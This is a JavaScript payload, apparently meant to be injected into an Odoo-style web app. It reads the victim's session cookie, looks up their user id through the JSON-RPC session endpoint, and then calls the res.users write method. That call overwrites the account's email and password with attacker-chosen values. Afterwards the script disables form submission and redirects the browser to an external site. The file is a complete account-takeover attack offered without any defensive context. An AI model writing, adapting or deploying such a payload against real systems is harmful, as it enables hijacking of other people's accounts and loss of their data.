// Function to get the value of a cookie
function getCookieValue(cookieName) {
  const name = cookieName + "=";
  const decodedCookie = decodeURIComponent(document.cookie);
  const cookieArray = decodedCookie.split(';');

  for (let i = 0; i < cookieArray.length; i++) {
    let cookie = cookieArray[i].trim();
    if (cookie.startsWith(name)) {
      return cookie.substring(name.length);
    }
  }

  return null; // Cookie not found
}

// Get "instance0|session_id" cookie
let sessionId = getCookieValue('instance0|session_id');
if (sessionId !== null) {
  // Remove quotes from the sessionId if present
  sessionId = sessionId.replace(/^"(.*)"$/, '$1');
  
  // Continue with the rest of your code that uses sessionId
} else {
  console.error('Cookie "instance0|session_id" not found');
}

// Prepare the JSON-RPC request to get the session info
const sessionInfoRequestData = {
  jsonrpc: "2.0",
  method: "call",
  params: {
    session_id: sessionId,
    context: {}
  },
  id: "r1"
};

// Send the JSON-RPC request to get the session info
fetch('/web/session/get_session_info', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify(sessionInfoRequestData),
})
  .then(response => response.json())
  .then(sessionInfoResult => {
    if (sessionInfoResult && sessionInfoResult.result && sessionInfoResult.result.uid) {
      const uid = sessionInfoResult.result.uid;

      // Prepare the JSON-RPC request data using the obtained uid
      const requestData = {
        jsonrpc: "2.0",
        method: "call",
        params: {
          model: "res.users",
          method: "write",
          args: [[uid], { email: "test@mail.com",password: "azerty123"}],
          kwargs: {},
          session_id: sessionId,
          context: {
            lang: "en_US",
            tz: false,
            uid: 1
          }
        },
        id: "r117"
      };

      // Send the JSON-RPC request
      return fetch('/web/dataset/call_kw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify(requestData),
      })
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('An error occurred during the JSON-RPC call');
  })
  .finally(() => {
    // Disable the onload attribute of the body
    document.body.removeAttribute('onload');
    // Override the form submission behavior
    window.HTMLFormElement.prototype.submit = function () {
      return false;
    };
    setTimeout(() => {
    window.location.href = 'https://tawtik.ma'; // Redirect to "https://tawtik.ma" at the end
    }, 0);
});
